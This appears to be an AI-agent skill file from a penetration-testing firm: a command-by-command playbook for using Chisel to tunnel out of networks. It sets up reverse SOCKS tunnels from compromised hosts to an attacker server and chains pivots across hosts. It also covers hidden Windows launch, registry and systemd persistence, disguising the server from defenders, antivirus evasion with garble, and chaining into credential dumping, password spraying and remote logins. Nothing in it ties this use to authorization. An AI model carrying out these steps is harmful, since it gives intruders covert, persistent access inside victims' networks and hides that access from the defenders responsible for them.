---
name: chisel
description: >
  Build, operate, and chain Chisel — a fast TCP/UDP tunnel over HTTP/HTTPS written in Go.
  Use when working with jpillora/chisel, when the user needs to tunnel traffic through
  firewalls, set up reverse tunnels from compromised hosts, create SOCKS proxies for pivoting,
  or forward ports across NAT boundaries. Covers installation, server/client setup, forward and
  reverse tunnels, SOCKS proxy, authentication, TLS, fingerprinting, multi-hop pivoting, and
  comparison with SSH tunneling and ligolo-ng.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/jpillora/chisel
  language: Go
---

# chisel Agent Skill

## When to Use This Skill

Use this skill when:
- The user needs to tunnel TCP/UDP traffic through HTTP/HTTPS (firewall bypass)
- Setting up reverse tunnels from a compromised host behind NAT
- Creating a SOCKS5 proxy for pivoting into internal networks
- The user asks about chisel, port forwarding, or HTTP-based tunneling
- Comparing chisel with SSH tunneling, ligolo-ng, or socat for pivot paths
- Automating tunnel setup in post-exploitation scripts

## What Chisel Does

Chisel is a fast, self-contained tunnel tool (single binary) that multiplexes TCP/UDP tunnels
over a single HTTP or HTTPS connection using SSH over WebSockets under the hood. It runs as
both server and client, supports reverse tunnels (client opens the connection, server exposes
the port), SOCKS5 proxy mode, and mTLS. Because traffic looks like HTTP/WebSocket, it bypasses
many egress firewall rules that allow port 80/443.

## Installation

### Go install (latest)
```bash
go install github.com/jpillora/chisel@latest
# Binary lands in $(go env GOPATH)/bin/chisel
```

### Pre-built releases (recommended for pentest targets)
```bash
# Download a release binary matching the target OS/arch
VERSION=1.10.0
curl -sSL https://github.com/jpillora/chisel/releases/download/v${VERSION}/chisel_${VERSION}_linux_amd64.gz \
  | gunzip > chisel && chmod +x chisel

# Windows (drop via webshell, meterpreter upload, etc.)
curl -sSL https://github.com/jpillora/chisel/releases/download/v${VERSION}/chisel_${VERSION}_windows_amd64.gz \
  | gunzip > chisel.exe
```

### Build from source
```bash
git clone https://github.com/jpillora/chisel
cd chisel && go build -ldflags "-s -w" -o chisel .
# Strip debug info to reduce binary size for deployment
```

### Docker (server-side)
```bash
docker run --rm -it -p 8080:8080 jpillora/chisel server --reverse
```

## Core Concepts

### Architecture
- **Server**: runs on your attack box or a pivot-friendly VPS; listens on an HTTP port
- **Client**: runs on the compromised host; connects OUT to the server (NAT-friendly)
- **Tunnels**: defined as `[R:]local_host:local_port:remote_host:remote_port`
- **`R:` prefix**: designates a reverse tunnel (server-side port → client's network)
- Multiplexing: all tunnels share a single WebSocket connection

### Tunnel Notation
```
# Forward tunnel (client-side → server exposes):
LOCAL_PORT:REMOTE_HOST:REMOTE_PORT

# Reverse tunnel (server opens port → traffic reaches client's network):
R:SERVER_PORT:TARGET_HOST:TARGET_PORT

# SOCKS5 proxy (reverse, dynamic):
R:socks
# or
R:1080:socks
```

## Server Setup

```bash
# Basic server (attack box / VPS)
chisel server --port 8080 --reverse

# With authentication (strongly recommended)
chisel server --port 8080 --reverse --auth ops:S3cr3tP@ss

# TLS with auto-generated self-signed cert
chisel server --port 443 --reverse --tls-domain ""   # uses a temp cert

# TLS with real cert (Let's Encrypt or existing)
chisel server --port 443 --reverse \
  --tls-cert /etc/letsencrypt/live/c2.example.com/fullchain.pem \
  --tls-key  /etc/letsencrypt/live/c2.example.com/privkey.pem

# Bind to specific interface only
chisel server --port 8080 --reverse --host 0.0.0.0

# Enable verbose logging
chisel server --port 8080 --reverse --verbose

# Proxy (masquerade as a normal web service on the same port)
chisel server --port 8080 --reverse --proxy http://example.com
# Non-tunnel requests are proxied to example.com — looks legit to blue team
```

## Client Connection

```bash
# Basic connection
chisel client http://ATTACKER_IP:8080 R:8888:127.0.0.1:8888

# With authentication
chisel client --auth ops:S3cr3tP@ss http://ATTACKER_IP:8080 R:8888:127.0.0.1:8888

# Over HTTPS with self-signed cert (skip TLS verify)
chisel client --tls-skip-verify https://ATTACKER_IP:443 R:socks

# Pin server fingerprint (SHA256 of server's public key)
chisel client --fingerprint "SHA256:abc123..." http://ATTACKER_IP:8080 R:socks

# Verbose output
chisel client --verbose http://ATTACKER_IP:8080 R:9050:socks

# Via HTTP proxy (e.g., corporate proxy on the compromised host)
chisel client --proxy http://corpproxy:3128 http://ATTACKER_IP:8080 R:socks

# Keep-alive interval (default 25s)
chisel client --keepalive 10s http://ATTACKER_IP:8080 R:socks

# Max retry count
chisel client --max-retry-count 3 http://ATTACKER_IP:8080 R:socks
```

## Forward Tunnels

Forward tunnels expose a remote service on a local port (client-side bind).

```bash
# Expose remote RDP (3389) on localhost:13389
chisel client http://ATTACKER:8080 3389:192.168.1.100:3389
# → connect your RDP client to 127.0.0.1:13389

# Multiple forward tunnels in one connection
chisel client http://ATTACKER:8080 \
  3389:192.168.1.100:3389 \
  8443:10.10.10.50:443   \
  5985:10.10.10.20:5985
```

## Reverse Tunnels

Reverse tunnels are the primary use-case for pentest: the compromised host connects OUT,
and the server exposes ports that route back into the target network.

```bash
# Server binds 2222 → traffic goes to target's 22
chisel client http://ATTACKER:8080 R:2222:127.0.0.1:22
# On attacker: ssh -p 2222 user@127.0.0.1

# Expose an internal SMB share
chisel client http://ATTACKER:8080 R:4445:10.10.10.5:445

# Expose an internal web app
chisel client http://ATTACKER:8080 R:8080:10.10.10.20:80

# SOCKS5 reverse proxy (full network pivot)
chisel client http://ATTACKER:8080 R:1080:socks
# On attacker: proxychains -f /etc/proxychains4.conf nmap -sT -Pn 10.10.10.0/24
```

## SOCKS5 Proxy Mode

SOCKS5 mode is the most flexible — you get a proxy that routes ANY TCP traffic to ANY
destination reachable from the compromised host.

```bash
# Server side: nothing special needed (--reverse flag enables it)
chisel server --port 8080 --reverse

# Client side: R:socks opens SOCKS5 on server's 127.0.0.1:1080
chisel client http://ATTACKER:8080 R:1080:socks

# Custom SOCKS port
chisel client http://ATTACKER:8080 R:9050:socks

# Configure proxychains (/etc/proxychains4.conf)
# [ProxyList]
# socks5 127.0.0.1 1080

# Use with proxychains
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24
proxychains curl http://10.10.10.100/
proxychains impacket-smbclient //10.10.10.5/C$ -U Administrator
```

## Authentication

```bash
# Server: single user
chisel server --port 8080 --reverse --auth alice:H4rdP@ss

# Server: multi-user via users file (JSON)
cat > /tmp/chisel-users.json <<'EOF'
{
  "alice:H4rdP@ss": [""],
  "bob:B0bP@ss":   ["^R:","^0.0.0.0:"]
}
EOF
chisel server --port 8080 --reverse --authfile /tmp/chisel-users.json
# Regex values restrict which tunnels each user can open
```

## TLS and Fingerprinting

```bash
# Capture server fingerprint (run on server, grab the printed line)
chisel server --port 443 --reverse --tls-domain "" 2>&1 | grep fingerprint
# Output: "Fingerprint SHA256:XXXX..."

# Client pins the fingerprint — immune to MITM
chisel client \
  --fingerprint "SHA256:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" \
  https://ATTACKER:443 R:socks

# mTLS: both sides authenticate with certs
chisel server --port 443 --reverse \
  --tls-ca /path/to/ca.pem \
  --tls-cert /path/to/server.pem \
  --tls-key /path/to/server-key.pem

chisel client \
  --tls-ca /path/to/ca.pem \
  --tls-cert /path/to/client.pem \
  --tls-key /path/to/client-key.pem \
  https://ATTACKER:443 R:socks
```

## Common Workflows

### Workflow 1: Pivot via Reverse SOCKS (most common)
```bash
# Attacker box
chisel server --port 80 --reverse --auth ops:pass

# On compromised host (Linux)
./chisel client --auth ops:pass http://ATTACKER_IP:80 R:1080:socks &

# Attacker: use the SOCKS proxy
proxychains nmap -sT -Pn -p 22,80,3389 10.0.0.0/24
proxychains evil-winrm -i 10.0.0.15 -u Administrator -p 'Password123'
```

### Workflow 2: Multi-hop pivot (double pivot)
```bash
# Host A (pivot 1, reachable from attacker)
chisel client http://ATTACKER:8080 R:8081:socks   # SOCKS at attacker:8081

# Host B (pivot 2, only reachable from Host A's network)
# Route through first SOCKS to reach Host A's chisel server
proxychains chisel client http://HOST_A_INTERNAL:8081 R:8082:socks
# Now attacker has SOCKS at 8082 into Host B's network
```

### Workflow 3: Expose internal RDP through firewall
```bash
# Compromised Windows host (PowerShell)
Start-Process -WindowStyle Hidden .\chisel.exe `
  -ArgumentList "client --auth ops:pass http://ATTACKER:8080 R:3390:127.0.0.1:3389"

# Attacker
xfreerdp /v:127.0.0.1:3390 /u:Administrator /p:'Password123'
```

### Workflow 4: Tunnel over port 443 to blend with HTTPS traffic
```bash
chisel server --port 443 --reverse --tls-domain "" --proxy https://microsoft.com
chisel client --tls-skip-verify --auth ops:pass https://ATTACKER:443 R:socks
```

## Advanced Techniques

### Run as a service (Linux systemd)
```ini
[Unit]
Description=chisel tunnel
After=network.target

[Service]
ExecStart=/usr/local/bin/chisel client --auth ops:pass http://ATTACKER:8080 R:1080:socks
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

### Windows persistence (registry run key)
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svc /t REG_SZ /d "C:\ProgramData\chisel.exe client --auth ops:pass http://ATTACKER:8080 R:1080:socks"
```

### Reduce binary size for staging
```bash
go build -ldflags "-s -w" -o chisel .
upx --best chisel   # optional UPX compression — triggers some AV
```

### Scripted multi-tunnel setup
```bash
#!/usr/bin/env bash
SERVER="http://ATTACKER:8080"
AUTH="--auth ops:pass"
chisel client $AUTH $SERVER \
  R:1080:socks \
  R:4445:10.10.10.5:445 \
  R:8443:10.10.10.20:443 &
echo "[*] Tunnels up. PID=$!"
```

## Comparison with SSH Tunneling and ligolo-ng

| Feature | Chisel | SSH Tunneling | ligolo-ng |
|---|---|---|---|
| Transport | HTTP/WS | SSH | TCP (TUN) |
| Reverse tunnel | Yes (R: prefix) | Yes (-R flag) | Yes (agent → server) |
| SOCKS proxy | Yes (R:socks) | Yes (-D) | Yes (--socks) |
| Single binary | Yes | Requires SSH | Yes |
| No SSH on target | Yes | No | Yes |
| TUN interface (routing) | No | No | Yes |
| Firewall bypass | Excellent (HTTP/443) | Good | Moderate |
| UDP support | Yes | Limited | Yes |
| Multi-user auth | Yes (authfile) | Via SSH users | API tokens |

**Choose chisel** when HTTP/HTTPS egress is available and you need a lightweight, single-binary
solution with no dependencies. **Choose ligolo-ng** when you want a routed TUN interface and
don't need to blend with HTTP traffic. **Use SSH tunneling** only when SSH is already available
and you don't need extra tooling.

## Integration with Other Tools

```bash
# proxychains → nmap full-network discovery
proxychains nmap -sT -Pn -p- --min-rate 1000 10.10.10.0/24 -oA internal_sweep

# proxychains → crackmapexec SMB spray
proxychains crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt

# proxychains → impacket suite
proxychains impacket-secretsdump -just-dc DOMAIN/Admin@10.10.10.1

# Metasploit: set PROXIES in module
# setg Proxies socks5:127.0.0.1:1080

# Burp Suite: configure SOCKS proxy in User Options → SOCKS Proxy
# → 127.0.0.1:1080 — then browse internal web apps through Burp
```

## Troubleshooting

| Problem | Likely Cause | Fix |
|---|---|---|
| `connection refused` on server | Port blocked or server not running | Check firewall, confirm server started |
| `invalid auth` | Auth mismatch | Verify --auth matches both sides |
| Tunnel connects but no traffic | Reverse port binding fails | Add `--host 0.0.0.0` to server |
| TLS handshake error | Cert mismatch | Use --tls-skip-verify or pin fingerprint |
| Client keeps reconnecting | Network instability | Lower --keepalive, add --max-retry-count |
| Binary detected by AV | Signatures | Recompile with custom ldflags, obfuscate with garble |
| Slow throughput | High-latency WebSocket | Use UDP tunnel if applicable; check MTU |

```bash
# Debug connection issues
chisel client --verbose --log-level debug http://ATTACKER:8080 R:socks 2>&1 | tee chisel-debug.log

# Test if server is reachable and serving chisel
curl -v http://ATTACKER:8080/
# Expect a 200 or 101 WebSocket upgrade response
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
